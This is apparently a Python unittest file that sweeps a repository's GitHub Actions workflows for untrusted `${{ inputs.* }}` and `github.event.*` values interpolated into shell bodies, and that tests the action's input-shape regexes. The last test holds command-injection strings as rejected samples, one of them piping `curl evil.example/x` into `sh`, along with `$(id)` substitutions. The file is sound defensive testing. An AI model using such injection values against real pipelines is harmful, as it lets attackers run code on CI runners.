"""No externally controlled value is interpolated into a shell body — register entry N16.

GitHub splices a `${{ }}` expression into the script TEXT before bash ever sees it. A value
carrying a quote or a semicolon therefore stops being data and becomes script. The safe form
is an `env:` binding, where the value reaches bash as a variable.

The finding this file closes stood one line above its own solution: the action's run step
routed `inputs.command` through `env:` and said why in a comment, while the step directly
above interpolated `inputs.version` and `inputs.extras` into the shell body.

So this is a SWEEP, not a case about one file: every action and every workflow in the tree
is examined, because a fix that only covers the place the finding named leaves its
neighbours open — and the neighbour here was one step away.
"""
import re
import unittest
from pathlib import Path

import yaml

REPO = Path(__file__).resolve().parents[1]

# Expression prefixes an attacker can influence. `github.event.*` and `inputs.*` are the
# two GitHub's own hardening guidance names first; `head_ref` is the classic pull-request
# case, where a branch name is attacker-chosen text.
GEFAEHRLICH = re.compile(
    r"\$\{\{\s*(inputs\.|github\.event\.|github\.head_ref|env\.GITHUB_HEAD_REF)", re.I)

# NAMED LIMIT of this set, measured rather than assumed. `steps.*.outputs.`, `needs.*.outputs.` and
# `github.actor` are NOT in it. A counter-reading of this tree extended the set and found four more
# sites, all in .github/workflows/release.yml (258, 385, 387, 388) and all harmless by origin: one
# is an output of the SHA-pinned attest-build-provenance action, three are hex digests from
# sha256sum. Widening the set here would therefore turn this sweep red on four sites that carry no
# defect, and the usual answer to that — an exception list — is the shape that later lets
# everything through. Widening the set is a decision of its own and is carried as an open entry in
# the findings register rather than settled here under landing pressure. So: a value that reaches
# a `run:` body through a step output is not caught by this sweep, and this comment is where that
# is said out loud instead of being discovered later.


# Directories that hold no action of ours. A sweep that walks them wastes time and can pick up a
# vendored workflow, which would be reported as if it were ours.
FREMD = (".git", ".venv", "venv", "node_modules", "build", "dist", ".mypy_cache", ".pytest_cache")


def yaml_dateien() -> list[Path]:
    """Every workflow and every composite action in the tree, found by SHAPE, not by one fixed path.

    The first version looked in `action/` and `.github/workflows/` and nowhere else. A composite
    action lives wherever somebody puts it, and `.github/actions/<name>/action.yml` is the usual
    second place. A sweep that never enters a directory says nothing about it while looking green,
    and nothing in the suite would report that the new directory is unseen. Measured on this tree:
    14 YAML files, 11 inside the two fixed paths, 3 outside them and none of those three carrying a
    `run:` body — so today the fixed paths lose nothing. The gap is in the rule, not in the count.
    """
    d: set[Path] = set()
    wf = REPO / ".github" / "workflows"
    if wf.is_dir():
        d |= set(wf.rglob("*.yml")) | set(wf.rglob("*.yaml"))
    for name in ("action.yml", "action.yaml"):
        d |= {p for p in REPO.rglob(name)
              if not any(teil in FREMD for teil in p.relative_to(REPO).parts)}
    return sorted(d)


def run_bloecke(datei: Path):
    """Yield (step name, run body) for every step that carries a shell body."""
    try:
        doc = yaml.safe_load(datei.read_text(encoding="utf-8"))
    except yaml.YAMLError as exc:
        raise AssertionError(f"{datei} is not valid YAML: {exc}") from exc
    if not isinstance(doc, dict):
        return
    schritte = []
    runs = doc.get("runs")
    if isinstance(runs, dict):
        schritte += runs.get("steps") or []
    for job in (doc.get("jobs") or {}).values():
        if isinstance(job, dict):
            schritte += job.get("steps") or []
    for s in schritte:
        if isinstance(s, dict) and isinstance(s.get("run"), str):
            yield s.get("name", "(unnamed)"), s["run"]


class TestKeineEinspeisungInEinenShellBody(unittest.TestCase):
    def test_es_gibt_ueberhaupt_etwas_zu_pruefen(self):
        """A sweep over an empty set is green and says nothing."""
        dateien = yaml_dateien()
        self.assertGreater(len(dateien), 1, "no action or workflow files found to sweep")
        # SPECIFIC, NOT MERELY NON-EMPTY. `len > 1` still holds after the one file this finding is
        # about is deleted or moved, and the sweep would then be green over everything except the
        # instance it exists for.
        self.assertIn(REPO / "action" / "action.yml", dateien,
                      "the composite action this finding is about is not in the swept set")
        self.assertTrue(any(any(True for _ in run_bloecke(d)) for d in dateien),
                        "no run blocks found — the sweep would pass vacuously")

    def test_KEINE_datei_interpoliert_eine_fremde_eingabe_in_einen_run_body(self):
        treffer = []
        for d in yaml_dateien():
            for name, body in run_bloecke(d):
                for m in GEFAEHRLICH.finditer(body):
                    zeile = body[:m.start()].count("\n") + 1
                    treffer.append(f"{d.relative_to(REPO)} · step {name!r} · run line {zeile}: "
                                   f"{m.group(0)}…")
        self.assertEqual(treffer, [], "externally controlled value interpolated into a shell "
                                      "body — route it through env: instead:\n  " +
                                      "\n  ".join(treffer))

    def test_die_action_fuehrt_ihre_drei_eingaben_ueber_env(self):
        """The specific instance, bound by effect rather than by reading the comment."""
        doc = yaml.safe_load((REPO / "action" / "action.yml").read_text(encoding="utf-8"))
        env_werte = set()
        for s in doc["runs"]["steps"]:
            for v in (s.get("env") or {}).values():
                env_werte.add(str(v))
        for feld in ("inputs.command", "inputs.version", "inputs.extras"):
            self.assertTrue(any(feld in v for v in env_werte),
                            f"{feld} does not travel through any env binding")

    def test_META_der_sweep_faengt_eine_eingepflanzte_einspeisung(self):
        """Without this the sweep could be green because its pattern matches nothing.

        An absence check that has never seen a presence cannot be told from one that
        always passes.
        """
        gepflanzt = 'echo "${{ inputs.version }}"'
        self.assertTrue(GEFAEHRLICH.search(gepflanzt))
        for harmlos in ('echo "${{ github.sha }}"',
                        'echo "$PB_VERSION"',
                        'echo "${{ runner.os }}"'):
            with self.subTest(harmlos=harmlos):
                self.assertIsNone(GEFAEHRLICH.search(harmlos),
                                  "a value the attacker does not control must not be flagged")


# The shape checks are read OUT OF the action, never typed here a second time.
#
# An earlier version of this file held its own copies of both patterns. They happened to be
# character-identical to the ones the step runs, and nothing enforced that. Weaken the pattern in
# action/action.yml to `^[=<>!~]{1,2}.*$` and leave the two error strings untouched, and every test
# in this file stays green: the presence check only looks for the message, and the value cases only
# ever exercised the copy. That is a guarantee about a stand-in instead of about the property.
_SHAPE_LINE = re.compile(
    r"""printf\s+'%s'\s+"\$(?P<var>PB_[A-Z]+)"\s*\|\s*grep\s+-Eq\s+'(?P<muster>[^']+)'""")


def action_muster() -> dict[str, re.Pattern[str]]:
    """The patterns the step actually runs, keyed by the variable they guard."""
    text = (REPO / "action" / "action.yml").read_text(encoding="utf-8")
    return {m.group("var"): re.compile(m.group("muster"))
            for m in _SHAPE_LINE.finditer(text)}


class TestFormpruefungDerEingaben(unittest.TestCase):
    """env: alone is secure only until someone rewrites the step. The shape check survives."""

    def setUp(self):
        self.muster = action_muster()

    def test_beide_muster_sind_ueberhaupt_auffindbar(self):
        """Without this the value cases below would pass vacuously over an empty dict."""
        self.assertEqual(sorted(self.muster), ["PB_EXTRAS", "PB_VERSION"],
                         "the action does not guard both inputs with a shape check, or the step "
                         "was rewritten in a form this reader no longer recognises")

    def test_die_action_prueft_beide_eingaben_auf_ihre_form(self):
        text = (REPO / "action" / "action.yml").read_text(encoding="utf-8")
        self.assertIn("is not a PEP 440 specifier", text)
        self.assertIn("is not a comma-separated list of names", text)

    def test_die_erlaubten_formen_nehmen_echte_werte_an(self):
        for gut in ("==6.0.0", ">=6.0", "~=6.0.1", "==6.0.0rc1"):
            with self.subTest(v=gut):
                self.assertRegex(gut, self.muster["PB_VERSION"])
        for gut in ("eval", "eval,inspect", "dev-tools"):
            with self.subTest(e=gut):
                self.assertRegex(gut, self.muster["PB_EXTRAS"])

    def test_die_erlaubten_formen_weisen_die_einspeisung_ab(self):
        for boese in ('==1.0.0"; curl evil.example/x | sh; echo "',
                      "==1.0.0 $(id)", "==1.0.0`id`", "; id", "==1.0.0\nid"):
            with self.subTest(v=boese):
                self.assertNotRegex(boese, self.muster["PB_VERSION"])
        for boese in ("eval; id", "eval$(id)", "eval inspect", "eval,"):
            with self.subTest(e=boese):
                self.assertNotRegex(boese, self.muster["PB_EXTRAS"])


if __name__ == "__main__":
    unittest.main(verbosity=2)
